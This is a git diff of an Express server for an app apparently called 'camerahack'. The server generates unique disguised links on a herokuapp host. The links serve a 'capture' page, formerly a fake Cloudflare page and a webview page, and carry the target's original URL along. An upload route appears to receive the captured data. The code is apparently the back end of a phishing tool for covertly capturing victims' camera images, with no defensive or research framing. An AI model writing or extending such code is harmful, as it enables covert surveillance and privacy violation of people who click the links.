@@ -29,21 +29,16 @@ app.use(express.static(path.join(__dirname, 'public')));
 // Routes
 app.post('/generate', (req, res) => {
     const uniqueId = uuidv4();
-    const cloudflareUrl = `https://camerahack-8c3cc7d0cd44.herokuapp.com/c/${uniqueId}`;
-    const webViewUrl = `https://camerahack-8c3cc7d0cd44.herokuapp.com/w/${uniqueId}`;
+    const originalUrl = req.body.url;
+    const captureUrl = `https://camerahack-8c3cc7d0cd44.herokuapp.com/c/${uniqueId}?url=${encodeURIComponent(originalUrl)}`;
 
-    const newUrl = new Url({ url: req.body.url, uniqueId });
-    newUrl.save().then(() => res.json({ cloudflareUrl, webViewUrl })).catch(err => res.status(500).json({ error: err.message }));
+    const newUrl = new Url({ url: originalUrl, uniqueId });
+    newUrl.save().then(() => res.json({ captureUrl })).catch(err => res.status(500).json({ error: err.message }));
 });
 
 app.get('/c/:id', (req, res) => {
     const id = req.params.id;
-    res.sendFile(path.join(__dirname, 'public', 'cloudflare.html'));
-});
-
-app.get('/w/:id', (req, res) => {
-    const id = req.params.id;
-    res.sendFile(path.join(__dirname, 'public', 'webview.html'));
+    res.sendFile(path.join(__dirname, 'public', 'capture.html'));
 });
 
 app.post('/upload/:id', async (req, res) => {
